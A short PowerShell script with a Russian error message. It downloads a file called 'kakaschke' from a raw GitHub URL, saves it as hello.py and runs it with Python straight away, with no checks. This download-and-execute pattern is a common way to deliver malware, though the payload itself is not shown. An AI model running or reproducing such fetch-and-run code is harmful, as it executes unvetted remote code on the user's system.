$pythonScriptUrl = "https://raw.githubusercontent.com/Sad-Boy-Smoke/tupa_ugar_epta/refs/heads/main/kakaschke"

$outputFile = "hello.py"

try {
    Invoke-RestMethod -Uri $pythonScriptUrl -OutFile $outputFile

    if (-not (Get-Command python -ErrorAction SilentlyContinue)) {
    }
    python $outputFile

} catch {
    Write-Host "Ошибка: $_" -ForegroundColor Red
    exit 1
}
